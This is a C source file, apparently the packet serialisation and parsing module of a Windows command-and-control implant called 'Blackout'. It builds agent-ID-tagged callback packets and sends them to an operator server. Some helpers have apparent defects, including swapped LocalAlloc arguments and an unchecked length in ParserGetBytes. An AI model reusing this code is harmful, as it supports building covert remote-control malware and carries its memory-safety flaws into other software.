#include <common.h>
#include <communication.h>

FUNC VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
{
    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

FUNC VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size ) {
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

FUNC VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt ) {
    BLACKOUT_INSTANCE

    Package->Buffer = Instance()->Win32.LocalReAlloc( Package->Buffer, Package->Length + sizeof( UINT32 ), LMEM_MOVEABLE );

    Int32ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( UINT32 );
}

FUNC VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
{
    BLACKOUT_INSTANCE
    Package->Buffer = Instance()->Win32.LocalReAlloc(
        Package->Buffer,
        Package->Length + sizeof( UINT64 ),
        LMEM_MOVEABLE
    );

    Int64ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Size   =  Package->Length;
    Package->Length += sizeof( UINT64 );
}

FUNC VOID PackageAddPad( PPACKAGE Package, PUCHAR Data, SIZE_T Size )
{
    BLACKOUT_INSTANCE
    Package->Buffer = Instance()->Win32.LocalReAlloc(
        Package->Buffer,
        Package->Length + Size,
        LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    MemCopy( Package->Buffer + ( Package->Length ), Data, Size );

    Package->Size   =  Package->Length;
    Package->Length += Size;
}


FUNC VOID PackageAddBytes( PPACKAGE Package, PUCHAR Data, SIZE_T Size ) {
    BLACKOUT_INSTANCE
    PackageAddInt32( Package, Size );

    Package->Buffer = Instance()->Win32.LocalReAlloc( Package->Buffer, Package->Length + Size, LMEM_MOVEABLE | LMEM_ZEROINIT );

    Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );

    MemCopy( Package->Buffer + Package->Length, Data, Size );

    Package->Size   =   Package->Length;
    Package->Length +=  Size;
}

// For callback to server
FUNC PPACKAGE PackageCreate( UINT32 CommandID )
{
    BLACKOUT_INSTANCE
    PPACKAGE Package = NULL;

    Package            = Instance()->Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer    = Instance()->Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
    Package->Length    = 0;
    Package->CommandID = CommandID;
    Package->Encrypt   = FALSE;

    PackageAddInt32( Package, 0 );
    PackageAddInt32( Package, BLACKOUT_MAGIC_VALUE );
    PackageAddInt32( Package, Instance()->Session.AgentId );
    PackageAddInt32( Package, CommandID );

    return Package;
}

// For serialize raw data
FUNC PPACKAGE PackageNew(  )
{
    BLACKOUT_INSTANCE
    PPACKAGE Package = NULL;

    Package          = Instance()->Win32.LocalAlloc( sizeof( PACKAGE ), LPTR );
    Package->Buffer  = Instance()->Win32.LocalAlloc( 0, LPTR );
    Package->Length  = 0;
    Package->Encrypt = TRUE;

    PackageAddInt32( Package, 0 );
    PackageAddInt32( Package, 0x00 );

    return Package;
}

FUNC VOID PackageDestroy( PPACKAGE Package )
{
    BLACKOUT_INSTANCE
    if ( ! Package ) {
        return;
    }
    if ( ! Package->Buffer ) {
        return;
    }

    Instance()->Win32.LocalFree( Package->Buffer );

    Instance()->Win32.LocalFree( Package );
}

FUNC BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
{
    BOOL Success     = FALSE;

    if ( Package )
    {
        // writes package length to buffer
        Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) ) {
            Success = TRUE;
        }

        PackageDestroy( Package );
    }
    else
        Success = FALSE;

    return Success;
}

FUNC VOID PackageTransmitError(
    UINT32   ErrNmb
) {
    BLACKOUT_INSTANCE

    if ( BK_PACKAGE ) {
        PackageDestroy( BK_PACKAGE );
    }

    BK_PACKAGE = PackageCreate( BLACKOUT_ERROR );
    
    CHAR ErrMsg[MAX_PATH] = {'\0'};
    PSTR p = ErrMsg;

    Instance()->Win32.FormatMessageA( 
        FORMAT_MESSAGE_FROM_SYSTEM | 
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, ErrNmb,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        ErrMsg, MAX_PATH, NULL 
    );

    while (*p++)
    {
        if ((*p != 9 && *p < 32) || *p == 46)
        {
            *p = 0;
            break;
        }
    }

    BK_PRINT( "[!] failed with err: %x (%s)\n", ErrNmb, ErrMsg );

    PackageAddInt32(  BK_PACKAGE, ErrNmb );
    PackageAddString( BK_PACKAGE, ErrMsg );
    PackageTransmit(  BK_PACKAGE, NULL, NULL );
}

FUNC VOID PackageAddBool(
    _Inout_ PPACKAGE Package,
    _In_    BOOLEAN  Data
) {
    BLACKOUT_INSTANCE
    
    if ( ! Package ) {
        return;
    }

    Package->Buffer = Instance()->Win32.LocalReAlloc( 
        Package->Buffer, 
        Package->Length + sizeof( UINT32 ),
        LMEM_MOVEABLE
    );

    Int32ToBuffer( Package->Buffer + Package->Length, Data ? 1 : 0 );

    Package->Length += sizeof( UINT32 );
}

FUNC VOID PackageAddString( PPACKAGE package, PCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthA( data ) );
}

FUNC VOID PackageAddWString( PPACKAGE package, PWCHAR data )
{
    PackageAddBytes( package, (PBYTE) data, StringLengthW( data ) * 2 );
}

FUNC void ParserNew( PPARSER parser, PVOID Buffer, UINT32 size ) {
    BLACKOUT_INSTANCE

    if ( parser == NULL )
        return;


    parser->Original = Instance()->Win32.LocalAlloc( LPTR, size );
    MmCopy( parser->Original, Buffer, size );
    parser->Buffer   = parser->Original;
    parser->Length   = size;
    parser->Size     = size;
}

FUNC int ParserGetInt32( PPARSER parser ) {
    INT32 intBytes = 0;

    if ( parser->Length < 4 )
        return 0;

    MmCopy( &intBytes, parser->Buffer, 4 );

    parser->Buffer += 4;
    parser->Length -= 4;

    if ( ! parser->Endian )
        return ( INT ) intBytes;
    else
        return ( INT ) __builtin_bswap32( intBytes );
}

FUNC PCHAR ParserGetBytes( PPARSER parser, PUINT32 size ) {
    UINT32  Length  = 0;
    PCHAR   outdata = NULL;

    if ( parser->Length < 4 )
        return NULL;

    MmCopy( &Length, parser->Buffer, 4 );
    parser->Buffer += 4;

    if ( parser->Endian )
        Length = __builtin_bswap32( Length );

    outdata = parser->Buffer;
    if ( outdata == NULL )
        return NULL;

    parser->Length -= 4;
    parser->Length -= Length;
    parser->Buffer += Length;

    if ( size != NULL )
        *size = Length;

    return outdata;
}

FUNC void ParserDestroy( PPARSER Parser ) {
    BLACKOUT_INSTANCE

    if ( Parser->Original ) {
        Instance()->Win32.LocalFree( Parser->Original );
    }
}

FUNC PCHAR ParserGetString( PPARSER parser, PUINT32 size )
{
    return ( PCHAR ) ParserGetBytes( parser, size );
}

FUNC PWCHAR ParserGetWString( PPARSER parser, PUINT32 size )
{
    return ( PWCHAR ) ParserGetBytes( parser, size );
}

FUNC INT16 ParserGetInt16( PPARSER parser )
{
    INT16 intBytes = 0;

    if ( parser->Length < 2 )
        return 0;

    MmCopy( &intBytes, parser->Buffer, 2 );

    parser->Buffer += 2;
    parser->Length -= 2;

    return intBytes;
}

FUNC INT64 ParserGetInt64( PPARSER parser )
{
    INT64 intBytes = 0;

    if ( ! parser )
        return 0;

    if ( parser->Length < 8 )
        return 0;

    MmCopy( &intBytes, parser->Buffer, 8 );

    parser->Buffer += 8;
    parser->Length -= 8;

    if ( ! parser->Endian )
        return ( INT64 ) intBytes;
    else
        return ( INT64 ) __builtin_bswap64( intBytes );
}

FUNC BOOL ParserGetBool( PPARSER parser )
{
    INT32 intBytes = 0;

    if ( ! parser )
        return 0;

    if ( parser->Length < 4 )
        return 0;

    MmCopy( &intBytes, parser->Buffer, 4 );

    parser->Buffer += 4;
    parser->Length -= 4;

    if ( ! parser->Endian )
        return intBytes != 0;
    else
        return __builtin_bswap32( intBytes ) != 0;
}

FUNC BYTE ParserGetByte( PPARSER parser )
{
    BYTE intBytes = 0;

    if ( parser->Length < 1 )
        return 0;

    MmCopy( &intBytes, parser->Buffer, 1 );

    parser->Buffer += 1;
    parser->Length -= 1;

    return intBytes;
}